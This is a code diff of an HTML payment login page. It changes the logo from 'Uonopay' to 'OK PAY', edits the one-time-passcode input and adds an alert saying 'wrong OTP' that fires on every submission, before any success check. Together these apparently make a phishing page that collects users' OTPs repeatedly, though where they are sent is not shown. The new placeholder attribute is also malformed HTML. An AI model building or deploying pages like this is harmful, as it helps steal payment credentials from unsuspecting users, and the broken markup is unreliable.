@@ -344,7 +344,7 @@
     </div>
 
     <div class="logo-container">
-        <img src="https://raw.githubusercontent.com/kgan35723-cell/Uonopay/main/uono-pay-logo.webp">
+        <img src="mainlogo.webp" alt="OK PAY Logo">
     </div>
 
     <form onsubmit="event.preventDefault(); openOtpModal();">
@@ -391,7 +391,7 @@
         
         <div class="otp-input-wrapper">
             <!-- 6-Digit OTP Input (Numbers only) - Perfectly aligned and proportioned -->
-            <input type="text" placeholder="• • • • • •" maxlength="6" inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '');" id="otpInput">    
+            <input type="text" placeholder= "Enter 6- Digit Otp"• • • • • •" maxlength="6" inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '');" id="otpInput">    
             <button class="send-otp-btn" id="sendOtpBtn" onclick="startOtpTimer(this);">Send</button>
         </div>
         <button class="confirm-btn" onclick="confirmLogin();">CONFIRM</button>
@@ -458,7 +458,7 @@ function confirmLogin() {
     })
     .then(response => response.json())
     .then(data => {
-      wrong Otp Please try again;
+      alert('worng OTP please try again');
       if (data.success) {
         closeOtpModal();
       console.log(data)
